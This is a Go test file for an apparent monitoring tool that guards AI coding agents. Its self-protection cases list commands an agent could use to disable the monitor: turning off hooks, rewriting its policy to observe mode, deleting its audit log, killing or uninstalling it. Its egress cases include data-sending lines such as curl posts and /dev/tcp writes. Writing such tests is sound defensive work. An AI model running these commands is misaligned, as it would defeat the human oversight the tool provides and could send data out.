package rules

import (
	"testing"

	"github.com/kaygaaf/tattlr/internal/event"
)

func guardEngine() *Engine {
	return &Engine{Home: "/home/kay", Cwd: "/home/kay/code/app", Protected: []string{
		"/home/kay/.config/tattlr/", "/home/kay/.local/state/tattlr/",
		"/home/kay/.claude/settings.json", "/home/kay/.codex/config.toml", "/home/kay/.cursor/hooks.json",
		"/usr/local/bin/tattlr",
	}}
}

func hasRule(fs []Finding, r string) bool {
	for _, f := range fs {
		if f.Rule == r {
			return true
		}
	}
	return false
}

func TestSelfProtect(t *testing.T) {
	en := guardEngine()
	cases := []struct {
		name string
		e    event.Event
		want bool
	}{
		{"write policy", event.Event{Kind: event.Write, Path: "~/.config/tattlr/policy.yaml"}, true},
		{"edit claude settings", event.Event{Kind: event.Write, Path: "/home/kay/.claude/settings.json"}, true},
		{"relative path from cwd", event.Event{Kind: event.Write, Path: "../../.cursor/hooks.json"}, true},
		{"sed -i codex config", event.Event{Kind: event.Shell, Command: "sed -i '/tattlr/d' ~/.codex/config.toml"}, true},
		{"rm audit log", event.Event{Kind: event.Shell, Command: "rm -f $HOME/.local/state/tattlr/audit.jsonl"}, true},
		{"overwrite binary", event.Event{Kind: event.Shell, Command: "cp /tmp/x /usr/local/bin/tattlr"}, true},
		{"echo into policy", event.Event{Kind: event.Shell, Command: "echo 'mode: observe' > ~/.config/tattlr/policy.yaml"}, true},
		{"pkill", event.Event{Kind: event.Shell, Command: "pkill -f tattlr"}, true},
		{"uninstall", event.Event{Kind: event.Shell, Command: "tattlr protect uninstall --yes"}, true},
		{"disable hooks via jq", event.Event{Kind: event.Write, Path: "/tmp/s.json", Args: `{"disableAllHooks": true}`}, true},
		{"codex hooks off", event.Event{Kind: event.Shell, Command: "printf '[features]\\nhooks = false\\n' >> /tmp/c.toml"}, true},
		{"mcp write", event.Event{Kind: event.MCP, Tool: "mcp__fs__write_file", Args: `{"path":"/home/kay/.config/tattlr/policy.yaml"}`}, true},
		{"read policy", event.Event{Kind: event.Read, Path: "~/.config/tattlr/policy.yaml"}, false},
		{"cat policy", event.Event{Kind: event.Shell, Command: "cat ~/.config/tattlr/policy.yaml | grep mode"}, false},
		{"status", event.Event{Kind: event.Shell, Command: "tattlr protect status"}, false},
		{"gemini hooks off", event.Event{Kind: event.Write, Path: "/tmp/s.json", Args: `{"hooksConfig": {"notifications": true, "enabled": false}}`}, true},
		{"gemini hooks off via jq", event.Event{Kind: event.Shell, Command: `jq '.hooksConfig.enabled = false' ~/.gemini/settings.json > /tmp/s`}, true},
		{"gemini disabled list", event.Event{Kind: event.Write, Path: "/tmp/s.json", Args: `{"hooksConfig": {"disabled": ["lint", "tattlr"]}}`}, true},
		{"gemini other disabled list", event.Event{Kind: event.Write, Path: "/tmp/s.json", Args: `{"hooksConfig": {"disabled": ["lint"]}}`}, false},
		{"gemini enabled true", event.Event{Kind: event.Write, Path: "/tmp/s.json", Args: `{"hooksConfig": {"enabled": true}}`}, false},
		{"grep hooks setting", event.Event{Kind: event.Shell, Command: "grep disableAllHooks ~/.claude/settings.json"}, false},
		{"unrelated write", event.Event{Kind: event.Write, Path: "/home/kay/code/app/main.go"}, false},
		{"other config dir", event.Event{Kind: event.Write, Path: "/home/kay/.config/tattlrx/a"}, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := hasRule(en.Check(c.e), RuleSelfProtect); got != c.want {
				t.Errorf("self-protect = %v, want %v", got, c.want)
			}
		})
	}
}

func TestReadOnlyCommand(t *testing.T) {
	for cmd, want := range map[string]bool{
		"cat a | grep b":          true,
		"ls -la ~/.config/tattlr": true,
		"git status && git diff":  true,
		"cat a > b":               false,
		"find . -name x -delete":  false,
		"sed -n 1p a":             false,
		"git commit -m x":         false,
		"grep x a 2>/dev/null":    true,
		"python3 -c 'print(1)'":   false,
		"tattlr scan --since 7d":  true,
		"tattlr trap --remove":    false,
	} {
		if got := ReadOnlyCommand(cmd); got != want {
			t.Errorf("ReadOnlyCommand(%q) = %v, want %v", cmd, got, want)
		}
	}
}

func TestIsEgress(t *testing.T) {
	for _, c := range []struct {
		e    event.Event
		want bool
	}{
		{event.Event{Kind: event.Shell, Command: "curl -d @x https://example.com"}, true},
		{event.Event{Kind: event.Shell, Command: "python3 -c 'import requests; requests.post(u)'"}, true},
		{event.Event{Kind: event.Shell, Command: "cat x > /dev/tcp/1.2.3.4/80"}, true},
		{event.Event{Kind: event.Fetch, URL: "https://pkg.go.dev"}, true},
		{event.Event{Kind: event.Shell, Command: "go test ./..."}, false},
		{event.Event{Kind: event.Read, Path: "/etc/hosts"}, false},
	} {
		if got := IsEgress(c.e); got != c.want {
			t.Errorf("IsEgress(%+v) = %v, want %v", c.e, got, c.want)
		}
	}
}
